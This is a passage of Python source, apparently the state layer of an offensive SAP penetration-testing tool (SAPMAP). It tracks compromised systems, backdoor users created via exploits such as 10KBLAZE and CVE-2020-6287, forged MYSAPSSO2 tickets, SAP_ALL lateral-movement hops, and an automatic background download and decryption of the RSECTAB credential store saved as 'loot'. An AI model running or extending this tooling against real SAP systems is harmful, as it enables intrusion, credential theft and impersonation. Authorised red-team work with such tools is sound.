    def dedupe_scc_nodes(self) -> list:
        """Collapse duplicate SCC nodes that reference the same host
        under different aliases (e.g. "s4hanadev" and "192.168.2.209"
        both being the same physical Cloud Connector).

        Runs the same alias-matching logic as find_scc_by_alias — for
        each pair that resolves to the same host, keep the "richer"
        node (the one with a backup pulled, credentials captured,
        mappings, PP analysis, …) and merge missing fields from the
        sparser one before dropping it.

        Returns a list of (dropped_key, merged_into_key) tuples so
        callers can log what changed.  Safe to call repeatedly.
        """
        if len(self.scc_nodes) < 2:
            return []
        merged = []
        # Iterate over a copy of the keys so we can mutate the dict.
        keys = list(self.scc_nodes.keys())
        seen = set()
        # For each key, find every OTHER key that aliases to it.
        for k in keys:
            if k in seen or k not in self.scc_nodes:
                continue
            base = self.scc_nodes[k]
            # Collect every peer key that resolves to the same host as
            # base (by field match or by DNS).
            for other_key in list(self.scc_nodes.keys()):
                if other_key == k or other_key in seen:
                    continue
                if not self._scc_keys_alias(k, other_key):
                    continue
                other = self.scc_nodes[other_key]
                # Pick the richer node as the survivor.
                if _scc_richness(other) > _scc_richness(base):
                    survivor, loser = other, base
                    survivor_key, loser_key = other_key, k
                else:
                    survivor, loser = base, other
                    survivor_key, loser_key = k, other_key
                _merge_scc_fields(survivor, loser)
                del self.scc_nodes[loser_key]
                seen.add(loser_key)
                merged.append((loser_key, survivor_key))
                if loser_key == k:
                    # We dropped the outer iteration's node — stop
                    # aliasing against it.
                    base = survivor
                    k = survivor_key
        return merged

    def _scc_keys_alias(self, a: str, b: str) -> bool:
        """True iff SCC dict keys a and b reference the same physical
        Cloud Connector (host or IP alias, incl. DNS resolution)."""
        if a == b:
            return True
        na = self.scc_nodes.get(a)
        nb = self.scc_nodes.get(b)
        if na is None or nb is None:
            return False
        aliases_a = {s.lower() for s in (na.host or "", na.ip or "", a) if s}
        aliases_b = {s.lower() for s in (nb.host or "", nb.ip or "", b) if s}
        if aliases_a & aliases_b:
            return True
        # SAP-node cross-reference: a SAP node co-located with either
        # SCC contributes its hostname/IP aliases to that SCC's set.
        try:
            for sn in getattr(self, "nodes", {}).values():
                names = {h.lower() for h in
                         (getattr(sn, "all_hostnames", lambda: [])() or [])}
                ips = set(getattr(sn, "all_ips", lambda: [])() or [])
                if not names and getattr(sn, "hostname", ""):
                    names = {sn.hostname.lower()}
                if not ips and getattr(sn, "ip", ""):
                    ips = {sn.ip}
                node_aliases = names | ips
                touches_a = bool(node_aliases & aliases_a)
                touches_b = bool(node_aliases & aliases_b)
                if touches_a:
                    aliases_a |= node_aliases
                if touches_b:
                    aliases_b |= node_aliases
            if aliases_a & aliases_b:
                return True
        except Exception:
            pass
        # DNS both directions.
        try:
            import socket
            for x in list(aliases_a):
                try:
                    if socket.gethostbyname(x).lower() in aliases_b:
                        return True
                except Exception:
                    pass
            for x in list(aliases_b):
                try:
                    if socket.gethostbyname(x).lower() in aliases_a:
                        return True
                except Exception:
                    pass
        except Exception:
            pass
        return False

    # -- Connection management --

    def materialise_type_g_target(self, conn: "RFCConnection",
                                     allow_placeholder: bool = True) -> None:
        """Attach a target node to a Type-G / HTTP RFCConnection.

        First tries to link to an existing node via find_node_by_host
        against the URL's hostname (Phase 3).  When no match exists
        AND ``allow_placeholder=True``, synthesises a placeholder
        node so the connection line has somewhere to end on the map
        (Phase 3b):

          * conn.is_btp_dest → reuse the existing BTPDISC_<slug>
            path for uniformity with BTP-sourced destinations.
          * otherwise         → RFCDISC_<slug> with
            discovered_via_rfc_g=True.

        ``allow_placeholder=False`` is the safe default used by
        ``add_connection``: we don't know yet whether the target is
        actually reachable, so plotting a placeholder for every
        RFCDES row would litter the map with dead-URL boxes.  Callers
        that have just verified reachability (ping_ok=True) pass
        allow_placeholder=True to promote the target.

        No-op for Type-3 connections (conn.conn_type != 'http') or
        when target_sid is already populated (e.g. by an earlier
        active probe in the retrieval pipeline).
        """
        if (getattr(conn, "conn_type", "rfc") or "rfc") != "http":
            return
        if conn.target_sid:
            return
        url = (conn.http_url or "").strip()
        if not url:
            return
        try:
            from urllib.parse import urlparse
            host = (urlparse(url).hostname or "").strip()
        except Exception:
            host = ""
        if not host:
            return

        # BTP-cloud short-circuit — hostnames matching *.hana.ondemand.com
        # (and the other BTP suffixes recognised by _classify_type_g_target)
        # belong on the cloud tier, not the on-prem layer.  Reuse an
        # existing BTPSubaccountNode when one already covers the same
        # FQDN, else synthesise a fresh cloud-shaped node.  This runs
        # regardless of ping_ok / allow_placeholder — a BTP tenant that
        # 401s on ping is still a legitimate landing zone for the edge,
        # and the operator needs the visual link.  Fixes: BTP conns
        # (is_btp_dest=True) ending up with target_sid='' after every
        # Retrieve-RFCs pass because _classify_type_g_target flags the
        # conn but doesn't attach a target.
        host_lc = host.lower()
        _BTP_SUFFIXES = (
            ".hana.ondemand.com",
            ".hana.ondemand.cn",
            ".hana.ondemand.sap",
            ".cloud.sap",
        )
        is_btp_host = (getattr(conn, "is_btp_dest", False)
                       or any(host_lc.endswith(sfx)
                              for sfx in _BTP_SUFFIXES))
        if is_btp_host:
            # Prefer an already-registered BTP subaccount whose FQDN
            # matches this hostname (exact key, then subdomain suffix
            # match so multiple destinations for the same tenant fold
            # into one cloud node).
            btp_uuid = None
            if host_lc in self.btp_subaccounts:
                btp_uuid = host_lc
            else:
                parts = host_lc.split(".")
                subdomain = parts[0] if parts else ""
                if subdomain:
                    for u, sub in self.btp_subaccounts.items():
                        if (getattr(sub, "subdomain", "") or "").lower() == subdomain:
                            btp_uuid = u
                            break
            if btp_uuid is None:
                parts = host_lc.split(".")
                subdomain = parts[0] if parts else ""
                region = parts[2] if len(parts) >= 3 else ""
                btp_uuid = host_lc
                self.btp_subaccounts[btp_uuid] = BTPSubaccountNode(
                    uuid=btp_uuid,
                    display_name=subdomain or host_lc,
                    region=region,
                    subdomain=subdomain,
                )
            conn.target_sid = btp_uuid
            conn.target_host = host
            conn.is_btp_dest = True
            return

        existing = self.find_node_by_host(hostname=host, ip=host)
        if existing is not None:
            conn.target_sid = existing.sid
            conn.target_host = existing.hostname or host
            conn.target_ip = existing.ip or (
                host if _looks_like_ipv4(host) else "")
            return

        # No existing node found.  When the caller hasn't confirmed
        # reachability yet, bail out without materialising — we don't
        # want to plot dead-URL boxes for every dangling Type-G
        # destination in RFCDES.  Ping loops that observe ping_ok=True
        # re-call with allow_placeholder=True to promote.
        if not allow_placeholder:
            return

        # No existing node — synthesise a placeholder.  Pick the
        # BTP path when the destination classifier flagged the
        # hostname as a BTP tenant; else use the RFC-G equivalent.
        if getattr(conn, "is_btp_dest", False):
            slug_prefix = "BTPDISC_"
        else:
            slug_prefix = "RFCDISC_"
        slug = (host.replace(".", "_").replace("-", "_")
                    .replace(":", "_").upper())
        sid_base = f"{slug_prefix}{slug}"
        sid = sid_base
        n = 2
        while sid in self.nodes:
            sid = f"{sid_base}_{n}"
            n += 1

        # System-type inference from URL port (best effort).
        port = 0
        try:
            from urllib.parse import urlparse as _urlparse
            port = _urlparse(url).port or 0
        except Exception:
            pass
        inferred_type = "UNKNOWN"
        inst_nr = ""
        if getattr(conn, "is_btp_dest", False):
            inferred_type = "BTP"
        elif getattr(conn, "os_access_type", "").startswith("sapcontrol"):
            inferred_type = "ABAP+JAVA"  # SAPControl runs on both
            # 5NN13/5NN14 → instance NN
            if 50000 <= port <= 59999 and port % 100 in (13, 14):
                inst_nr = f"{(port - 50000) // 100:02d}"
        elif getattr(conn, "os_access_type", "") == "hostagent_sapadm":
            inferred_type = "SAP"
        elif 50000 <= port <= 59999 and port % 100 == 0:
            # 5NN00 → Java HTTP for instance NN
            inferred_type = "JAVA"
            inst_nr = f"{(port - 50000) // 100:02d}"
        elif 8000 <= port <= 8099:
            # 80NN → ABAP ICM HTTP for instance NN
            inferred_type = "ABAP"
            inst_nr = f"{port - 8000:02d}"

        is_ip = _looks_like_ipv4(host)
        placeholder = SAPNode(
            sid=sid,
            system_type=inferred_type,
            hostname="" if is_ip else host,
            ip=host if is_ip else "",
            instances=([InstanceInfo(
                instance_nr=inst_nr,
                ip=host if is_ip else "",
                ports={port: "http"} if port else {})]
                if inst_nr else []),
        )
        placeholder.linked_target_sid = conn.source_sid
        if getattr(conn, "is_btp_dest", False):
            placeholder.discovered_via_btp = True
        else:
            placeholder.discovered_via_rfc_g = True
        self.nodes[sid] = placeholder
        conn.target_sid = sid
        conn.target_host = "" if is_ip else host
        conn.target_ip = host if is_ip else ""
        if inst_nr:
            conn.target_instance_nr = inst_nr

    def add_connection(self, conn: RFCConnection) -> None:
        # Type-G / HTTP destinations: try to LINK to an existing node
        # matching the URL host, but do NOT auto-materialise a
        # placeholder here — we don't know yet whether the target is
        # reachable, and littering the map with dead-URL RFCDISC_
        # boxes for every dangling destination is worse than showing
        # nothing.  The ping loop (Retrieve RFCs / Test HTTP) re-calls
        # materialise_type_g_target with allow_placeholder=True once
        # it has confirmed ping_ok=True.
        self.materialise_type_g_target(conn, allow_placeholder=False)
        was_new_or_elevated = True
        # Avoid duplicates
        for existing in self.connections:
            if (existing.source_sid == conn.source_sid and
                    existing.destination_name == conn.destination_name):
                # Only emit a finding if the SAP_ALL / logon state just
                # improved — otherwise updates on every poll would spam.
                if (existing.has_sap_all and existing.logon_successful
                        and conn.has_sap_all and conn.logon_successful):
                    was_new_or_elevated = False
                # Preserve enrichment fields from the existing
                # connection when the incoming one doesn't carry them.
                # Retrieve RFCs rebuilds connections from RFCDES with
                # empty secstore_password / profiles / etc.; without
                # this merge we'd lose the SecStore-decrypted password.
                preserve_if_empty = (
                    "secstore_password", "profiles", "roles",
                    "has_sap_all", "user_detail_error",
                    "logon_successful", "logon_tested",
                    "ping_ok", "tested", "latency_ms",
                    "sapxpg_remote_works", "remote_user_created",
                    "remote_user_name", "soap_rfc_verified",
                    # target_sid / target_host / target_ip preserved so a
                    # bare RFCDES re-fetch (which parses only source-side
                    # options) doesn't erase a target link established by
                    # an earlier probe — most importantly the
                    # is_btp_dest → BTPSubaccountNode link set by
                    # materialise_type_g_target.
                    "target_sid", "target_host", "target_ip",
                )
                for attr in preserve_if_empty:
                    old_val = getattr(existing, attr, None)
                    new_val = getattr(conn, attr, None)
                    if old_val and not new_val:
                        setattr(conn, attr, old_val)
                idx = self.connections.index(existing)
                self.connections[idx] = conn
                break
        else:
            self.connections.append(conn)
        # If the source node already has decrypted SecStore entries,
        # look up the password for this destination now.  Covers the
        # SecStore-first-then-Retrieve-RFCs order, where the conn is
        # brand new and the preserve-on-replace logic above doesn't fire.
        if not conn.secstore_password and conn.source_sid:
            src = self.get_node(conn.source_sid)
            if src and getattr(src, "secstore_entries", None):
                for entry in src.secstore_entries:
                    if (entry.get("dest_name", "") == conn.destination_name
                            and entry.get("password")):
                        conn.secstore_password = entry["password"]
                        break
        if (was_new_or_elevated and getattr(conn, 'logon_successful', False)
                and getattr(conn, 'has_sap_all', False)
                and conn.source_sid and conn.target_sid):
            try:
                from sapmap_findings import emit_finding
                # source_sid/target_sid travel in meta so the UI pulse
                # overlay can light up the specific edge between them.
                emit_finding(
                    "CRITICAL", conn.source_sid,
                    f"RFC destination {conn.destination_name!r} "
                    f"logs on to {conn.target_sid} as SAP_ALL "
                    f"— lateral-movement hop confirmed",
                    meta={"source_sid": conn.source_sid,
                          "target_sid": conn.target_sid},
                    attack_capability="lateral.rfc_propagate",
                )
            except Exception:
                pass

    def fold_btp_placeholders(self, canonical) -> int:
        """Merge FQDN-keyed placeholder BTP subaccounts into ``canonical``.

        materialise_type_g_target creates a BTPSubaccountNode keyed by the
        destination host FQDN (``<sub>.authentication.<region>.hana.
        ondemand.com``) the first time any RFC destination points at a
        BTP tenant — before the operator has run mint/harvest.  Later,
        when the mint/harvest path lands a token for the same tenant,
        it registers a *second* BTPSubaccountNode keyed by the real
        subaccount UUID, leaving two identical clouds side-by-side.

        This helper folds every other entry that shares ``canonical.
        subdomain`` (case-insensitive) into ``canonical``: connection
        target_sid pointers are rewritten to canonical.uuid, any
        destinations/position the placeholder accumulated are absorbed
        only when canonical is still empty, and the placeholder entry
        is deleted.  Returns the number of placeholders folded.

        Called by the mint/harvest sites once ``canonical.subdomain``
        is populated (so subdomain-matching is safe).
        """
        if not canonical:
            return 0
        subdomain = (canonical.subdomain or "").lower()
        if not subdomain:
            return 0
        canonical_uuid = canonical.uuid
        folded = 0
        for placeholder_uuid in list(self.btp_subaccounts.keys()):
            if placeholder_uuid == canonical_uuid:
                continue
            placeholder = self.btp_subaccounts[placeholder_uuid]
            if (getattr(placeholder, "subdomain", "") or "").lower() != subdomain:
                continue
            # Rewrite every connection's target_sid so edges keep
            # terminating on the canonical cloud after the placeholder
            # is deleted.
            for c in self.connections:
                if c.target_sid == placeholder_uuid:
                    c.target_sid = canonical_uuid
            # Absorb visual position only if canonical hasn't been
            # positioned yet (operator drag on the placeholder shouldn't
            # be lost).
            if not canonical.position and placeholder.position:
                canonical.position = placeholder.position
            # Absorb destinations only when canonical still has none —
            # the real UUID node from mint/harvest carries authoritative
            # destination data with cleartext creds; never overwrite it.
            if not canonical.destinations and placeholder.destinations:
                canonical.destinations = placeholder.destinations
            del self.btp_subaccounts[placeholder_uuid]
            folded += 1
        return folded

    def notify_sap_all_if_elevated(self, conn) -> None:
        """Emit a CRITICAL finding (with source/target meta for the pulse
        overlay) when a connection's has_sap_all + logon_successful flags
        are both True.

        The findings bus already dedupes identical (severity, node, msg)
        tuples within a 60s window, so this can safely be called multiple
        times from each RFC-check site without spamming the banner.  The
        payload mirrors the one produced by ``add_connection`` — the goal
        here is to cover the GUI flow where flags are mutated directly on
        an existing connection object rather than re-added.
        """
        if not (getattr(conn, 'logon_successful', False)
                and getattr(conn, 'has_sap_all', False)
                and conn.source_sid and conn.target_sid):
            return
        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "CRITICAL", conn.source_sid,
                f"RFC destination {conn.destination_name!r} "
                f"logs on to {conn.target_sid} as SAP_ALL "
                f"— lateral-movement hop confirmed",
                meta={"source_sid": conn.source_sid,
                      "target_sid": conn.target_sid},
                attack_capability="lateral.rfc_propagate",
            )
        except Exception:
            pass

    def get_connections_from(self, sid: str) -> list:
        return [c for c in self.connections if c.source_sid == sid]

    def get_connections_to(self, sid: str) -> list:
        return [c for c in self.connections if c.target_sid == sid]

    # -- User tracking --

    def track_created_user(self, user: CreatedUser) -> None:
        self.created_users.append(user)
        node = self.get_node(user.sid)
        if node:
            node.created_users.append(user)
            node.pwned = True
            # Successful user creation proves the client exists and is
            # reachable.  Add it to the enumerated clients list so the
            # System Details modal reflects what we verified, rather
            # than only what an explicit T000 read returned.  Category
            # 'V' = verified-via-user-creation (distinct from 'P'
            # productive / 'C' customizing read from T000).
            if user.client:
                cli = user.client.zfill(3)
                if not any(c.get("nr") == cli for c in node.clients):
                    node.clients.append({"nr": cli, "category": "V"})
            # Pin the credential as verified — track_created_user is
            # only reached AFTER the creation path ran test_connection
            # (and typically _user_has_sap_all) against the fresh
            # user, so we know these creds work end-to-end.  Without
            # this the GW-exploit / dpmon paths leave the credential
            # dangling in node.created_users, but nothing lands in
            # node.credentials with verified=True — downstream
            # consumers that filter on verified (e.g. TMS SM59-test
            # source-side cred collector) then act as if we have no
            # working credential at all.
            #
            # Dedupe by (username, client) — if a matching entry
            # already exists, upgrade its ``verified`` flag rather
            # than appending a duplicate.  Password is refreshed too
            # in case the creation just rotated it.
            if user.password and user.username:
                cli = (user.client or "").zfill(3) if user.client else ""
                match_key = (user.username.upper(), cli)
                existing = None
                for c in node.credentials:
                    ex_cli = (c.client or "").zfill(3) if c.client else ""
                    if (c.username or "").upper() == match_key[0] \
                            and ex_cli == match_key[1]:
                        existing = c
                        break
                if existing is not None:
                    existing.password = user.password
                    existing.verified = True
                    if user.instance_nr and not existing.instance_nr:
                        existing.instance_nr = user.instance_nr
                else:
                    node.credentials.append(Credentials(
                        username=user.username,
                        password=user.password,
                        client=user.client or "000",
                        instance_nr=user.instance_nr or "00",
                        verified=True,
                    ))
        # Map the creation METHOD to the right ATT&CK capability key so
        # the heatmap reflects what the operator actually exercised.
        # Methods that use an established RFC destination from another
        # SAPNode (BAPI + secstore + TCPIP SXPG) count as Lateral
        # Movement (T1021 Remote Services + T1078 Valid Accounts).
        # Methods that use an initial-access exploit on the target
        # itself (gw_exploit, java_recon) carry the corresponding
        # exploit capability so we don't double-count.
        _METHOD_ATTACK_CAP = {
            # ---- Initial Access (the exploit chain that lands the user) ----
            "gw_exploit":               "exploit.10kblaze",
            "java_recon":               "exploit.cve_2020_6287",
            # ---- Privilege Escalation ----
            "dpmon_sap_star":           "privesc.dpmon_sap_star",
            # ---- Lateral Movement via RFC ----
            #      Anything using a Type-3 RFC destination + BAPI_USER_CREATE1
            #      or TCP/IP RFC + SXPG_STEP_XPG_START is by definition
            #      remote-services lateral movement (T1021).
            "bapi_create":              "lateral.rfc_propagate",
            "rfc_destination":          "lateral.rfc_propagate",
            "direct_bapi_via_secstore": "lateral.rfc_propagate",
            "direct_bapi_pwd_reset":    "lateral.rfc_propagate",
            "direct_bapi_recreate":     "lateral.rfc_propagate",
            "secstore_direct":          "lateral.rfc_propagate",
            "tcpip_sxpg":               "lateral.rfc_propagate",
            # Phase 3a SOAP-RFC over HTTP — same semantic as direct
            # BAPI but transport is the ICM HTTP port (not gateway),
            # so it works against firewalled targets.  Still T1021 +
            # T1078 — lateral movement via remote services with
            # SecStore-recovered creds.
            "soap_rfc_via_secstore":    "lateral.rfc_propagate",
            # ``existing`` and ``reused_existing`` are reached only AFTER
            # a successful RFC connection to the target verified that
            # our user already lives there.  No fresh BAPI create, but
            # the lateral-movement primitive (Type-3 RFC + valid
            # account) WAS exercised — so they still count as T1021 +
            # T1078 on the heatmap.  Without this the operator runs a
            # propagate, sees JORIS@SAP_ALL on the remote, then notices
            # Lateral Movement stays dark on the matrix because the
            # account was pre-provisioned from a prior run.
            "existing":                 "lateral.rfc_propagate",
            "reused_existing":          "lateral.rfc_propagate",
            # ---- Not a true creation / lateral event ----
            #      Empty string = no ATT&CK tag.
            "provided":                 "",
            "java_preexisting_cached":  "",
        }
        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "CRITICAL", user.sid,
                f"User {user.username!r} created on client {user.client} "
                f"via {user.method} — system pwned",
                attack_capability=_METHOD_ATTACK_CAP.get(user.method, ""),
            )
        except Exception:
            pass

        # Implicit SecStore download — RSECTAB is the highest-value
        # immediate-loot on an ABAP system, the just-created user
        # typically has SAP_ALL, and operators routinely run this
        # action right after every create-user.  Fire-and-forget on
        # a daemon thread so the create-user flow itself isn't
        # blocked by the RSECTAB read.
        if node and "ABAP" in (node.system_type or "").upper():
            self._auto_download_secstore_async(node)

    # -- Forged ticket tracking --

    def track_forged_ticket(self, ticket: ForgedTicket) -> None:
        """Register a newly forged MYSAPSSO2 ticket.

        Stores the ticket BOTH on the issuing SID's node (so the UI
        can show "this system has ticket forgeries against it") AND on
        the global state.forged_tickets list (so we can enumerate the
        full set without iterating every node).  Mirrors the
        :meth:`track_created_user` two-tier pattern.

        Emits a CRITICAL finding — ticket forgery gives the operator
        impersonation across the entire STRUSTSSO2 trust subgraph and
        is arguably the highest-impact post-exploitation primitive
        SAPMAP can produce.
        """
        self.forged_tickets.append(ticket)
        node = self.get_node(ticket.sid)
        if node:
            node.forged_tickets.append(ticket)
            node.pwned = True
        try:
            from sapmap_findings import emit_finding
            pin_note = ""
            if ticket.recipient_sid:
                pin_note = (f" pinned to {ticket.recipient_sid}/"
                            f"{ticket.recipient_client}")
            emit_finding(
                "CRITICAL", ticket.sid,
                f"MYSAPSSO2 ticket forged: {ticket.user!r}@"
                f"{ticket.client}{pin_note}, "
                f"valid {ticket.validity_min} min — replayable across "
                f"the {ticket.sid} STRUSTSSO2 trust subgraph",
                attack_capability="lateral.mysapsso2_forge",
            )
        except Exception:
            pass

    def get_forged_tickets_for(self, sid: str) -> list:
        """Return tickets issued BY the given SID (i.e., signed by
        that system's SAPSYS.pse).  Includes expired ones — callers
        that want only live tickets must filter via
        ``ForgedTicket.is_expired()``.
        """
        return [t for t in self.forged_tickets if t.sid == sid]

    def get_forged_tickets_targeting(self, sid: str,
                                       client: str = "") -> list:
        """Return tickets that could be replayed against the given
        receiver.  Includes:
          * tickets explicitly pinned to ``sid`` (and optionally ``client``)
          * tickets with NO pinning (open scope — every trusted receiver)
        Excludes expired tickets.
        """
        out = []
        for t in self.forged_tickets:
            if t.is_expired():
                continue
            # Open-scope tickets work against any trusted receiver
            if not t.recipient_sid:
                out.append(t)
                continue
            if t.recipient_sid != sid:
                continue
            if client and t.recipient_client and t.recipient_client != client:
                continue
            out.append(t)
        return out

    def _auto_download_secstore_async(self, node) -> None:
        """Trigger an implicit RSECTAB download on a background thread.

        Skipped when this node already has secstore entries (avoid
        duplicate work after multiple user-creation events on the
        same node).  Failures never escape — the caller's create-user
        flow continues regardless.
        """
        if getattr(node, "secstore_entries", None):
            return  # already populated by a previous run
        import threading as _t
        def _run():
            try:
                from sapmap_findings import emit_finding
                from sapmap_secstore import (
                    download_and_decrypt, integrate_results, save_loot,
                    DEFAULT_KEY_HEX,
                )
                from sapmap_state import ensure_loot_dir
                creds = node.best_credentials()
                if not creds:
                    return

                # Phase 3b: if the target's gateway is unreachable
                # but we have a SOAP-RFC route, pass a soap_session
                # so the RSECTAB-via-ABAP step routes over HTTP.
                # Without this, every chunked RFC_ABAP_INSTALL_AND_RUN
                # attempt would silently burn 60s on pyrfc retries —
                # the auto-download would always fail on HTTP-only
                # targets.
                from sapmap_gui import (
                    resolve_soap_session_for_node)
                soap_session, soap_route = (
                    resolve_soap_session_for_node(
                        self, node, timeout=180.0))
                if soap_session is not None:
                    print(f"[*] SecStore {node.sid} (auto): "
                          f"gateway down — using SOAP-RFC "
                          f"via {soap_route['via_destination']}")

                emit_finding(
                    "INFO", node.sid,
                    "Auto-downloading SecStore (RSECTAB) — triggered "
                    "by user creation; this is the high-value loot "
                    "operators always want first.",
                    ref="secstore.auto.download.start")
                print(f"[*] SecStore {node.sid} (auto): starting after "
                      f"user creation — using best credentials")
                results = download_and_decrypt(
                    node, creds, DEFAULT_KEY_HEX, state=self,
                    soap_session=soap_session,
                    soap_route=soap_route)
                integrate_results(node, self, results)
                ok = [r for r in results
                      if not r.get("error") and r.get("password")]
                outfile = save_loot(node.sid, results,
                                     ensure_loot_dir("secstore"))
                print(f"[+] SecStore {node.sid} (auto): "
                      f"{len(results)} entries, {len(ok)} decrypted "
                      f"→ {outfile}")
                if ok:
                    emit_finding(
                        "CRITICAL", node.sid,
                        f"ABAP SecStore decrypted (auto-triggered "
                        f"after user creation) — {len(ok)} RFC "
                        f"destination password(s) recovered.",
                        ref="secstore.auto.decrypted",
                        attack_capability="creds.abap_secstore")
            except Exception as e:
                print(f"[-] SecStore {node.sid} (auto): failed "
                      f"silently — {e}")
        _t.Thread(target=_run, daemon=True,
                   name=f"secstore-auto-{node.sid}").start()

    # -- RFC check cache --

    def is_rfc_checked(self, destination_name: str) -> bool:
        return destination_name in self.rfc_check_cache

    def cache_rfc_check(self, destination_name: str, result: dict) -> None:
        self.rfc_check_cache[destination_name] = result

    def reset_rfc_cache(self) -> None:
        self.rfc_check_cache.clear()

    # -- Statistics --

    def stats(self) -> dict:
        # Count SAP nodes + SCCs + BTP subaccounts + DBCON cylinders.
        # The map draws a lightning bolt over any of those when their
        # .pwned flag is set, so the status-bar count has to include
        # all four or the operator sees an off-by-one (e.g. "Pwned: 6"
        # while the map shows 7 ⚡ symbols — one of them on a DBCON
        # cylinder that we've planted SAPMAP00 on via direct SQL).
        scc_pwned = sum(1 for s in self.scc_nodes.values()
                        if getattr(s, "pwned", False))
        btp_pwned = sum(1 for b in (self.btp_subaccounts or {}).values()
                         if getattr(b, "pwned", False))
        dbcon_edges_total = sum(
            len(getattr(n, "dbcon_edges", None) or [])
            for n in self.nodes.values())
        dbcon_pwned = sum(
            1 for n in self.nodes.values()
              for e in (getattr(n, "dbcon_edges", None) or [])
              if getattr(e, "pwned", False))
        # Exclude bare AWS placeholder SAPNodes (CSI_AWS_EC2 /
        # CSI_AWS_S3) — the frontend hides them from the map, so
        # counting them here would make the status-bar disagree
        # with what the operator sees ("14 systems" vs "I count 12").
        visible_sap_nodes = [n for n in self.nodes.values()
                              if not _is_bare_aws_default_node(n)]
        # SAProuter nodes already live in self.nodes (SAPNode with
        # .saprouter set), so they are counted via len(self.nodes).
        # SCCs, BTP subaccounts, and DBCON edges are tracked
        # separately, so summed in explicitly to match the box count
        # the operator sees on the map — each DBCON cylinder is its
        # own map box and its own ⚡ candidate, so it counts as a
        # "system" for the % readout to be honest.
        return {
            "systems": (len(visible_sap_nodes)
                        + len(self.scc_nodes)
                        + len(self.btp_subaccounts or {})
                        + dbcon_edges_total),
            "connections": len(self.connections),
            "pwned": (sum(1 for n in visible_sap_nodes if n.pwned)
                      + scc_pwned + btp_pwned + dbcon_pwned),
            "users_created": len(self.created_users),
            "production_systems": sum(1 for n in self.nodes.values() if n.is_production),
            "critical_connections": sum(1 for c in self.connections
                                        if c.has_sap_all and c.logon_successful),
        }

    # -- Serialization --

    def to_dict(self) -> dict:
        return {
            "version": self.version,
            "timestamp": self.timestamp,
            "scan_config": self.scan_config,
            "evasion": dict(self.evasion or {}),
            "nodes": {sid: node.to_dict() for sid, node in self.nodes.items()},
            "connections": [c.to_dict() for c in self.connections],
            "created_users": [u.to_dict() for u in self.created_users],
            "created_destinations": self.created_destinations,
            "rfc_check_cache": self.rfc_check_cache,
            "forged_tickets": [t.to_dict()
                               for t in self.forged_tickets],
            "trust_relations": [r.to_dict()
                                for r in self.trust_relations],
            "scc_nodes": {h: n.to_dict() for h, n in self.scc_nodes.items()},
            "btp_subaccounts": {
                u: n.to_dict() for u, n in self.btp_subaccounts.items()
            },
        }

    @classmethod
    def from_dict(cls, d: dict) -> SAPMAPState:
        state = cls(
            version=d.get("version", "1.0"),
            timestamp=d.get("timestamp", ""),
            scan_config=d.get("scan_config", {}),
            evasion=dict(d.get("evasion") or {}),
            rfc_check_cache=d.get("rfc_check_cache", {}),
        )
        for sid, node_d in d.get("nodes", {}).items():
            state.nodes[sid] = SAPNode.from_dict(node_d)
        state.connections = [RFCConnection.from_dict(c) for c in d.get("connections", [])]
        state.created_users = [CreatedUser.from_dict(u) for u in d.get("created_users", [])]
        state.created_destinations = d.get("created_destinations", [])
        state.forged_tickets = [ForgedTicket.from_dict(t)
                                for t in d.get("forged_tickets", [])]
        state.trust_relations = [TrustRelation.from_dict(r)
                                 for r in d.get("trust_relations", [])]
        for host, scc_d in d.get("scc_nodes", {}).items():
            state.scc_nodes[host] = SCCNode.from_dict(scc_d)
        # Fold SCC nodes that reference the same physical host under
        # different aliases (hostname vs IP).  Older state files can
        # carry a duplicate when HA-peer discovery ran BEFORE the
        # alias-aware lookup shipped — this pass collapses them on
        # load so the operator no longer sees two shadow boxes for
        # the same connector.
        state.dedupe_scc_nodes()
        for uuid, sub_d in d.get("btp_subaccounts", {}).items():
            state.btp_subaccounts[uuid] = BTPSubaccountNode.from_dict(sub_d)
        # One-shot dedup pass: fold FQDN-keyed placeholder BTP nodes
        # (from earlier materialise_type_g_target runs) into any
        # real-UUID node that shares the same subdomain.  Handles
        # sessions that were saved before fold_btp_placeholders was
        # wired into the mint/harvest sites — otherwise the operator
        # would see the duplicate cloud until they re-ran harvest.
        state._dedupe_btp_subaccounts_by_subdomain()
        return state

    def _dedupe_btp_subaccounts_by_subdomain(self) -> int:
        """Sweep btp_subaccounts and fold duplicates that share a
        subdomain.  Picks the winner per subdomain by preferring
        the one with more destinations, then pwned=True, then the
        shorter uuid (real UUIDs are shorter than FQDNs).  Returns
        the total number of nodes folded."""
        by_sub = {}
        for uuid, sub in self.btp_subaccounts.items():
            key = (sub.subdomain or "").lower()
            if not key:
                continue
            by_sub.setdefault(key, []).append(sub)
        folded = 0
        for group in by_sub.values():
            if len(group) < 2:
                continue
            group.sort(key=lambda s: (
                -len(s.destinations or []),
                0 if s.pwned else 1,
                len(s.uuid),
            ))
            canonical = group[0]
            folded += self.fold_btp_placeholders(canonical)
        return folded

    def to_json(self, indent: int = 2) -> str:
        return json.dumps(self.to_dict(), indent=indent, default=str)

    @classmethod
    def from_json(cls, json_str: str) -> SAPMAPState:
        return cls.from_dict(json.loads(json_str))
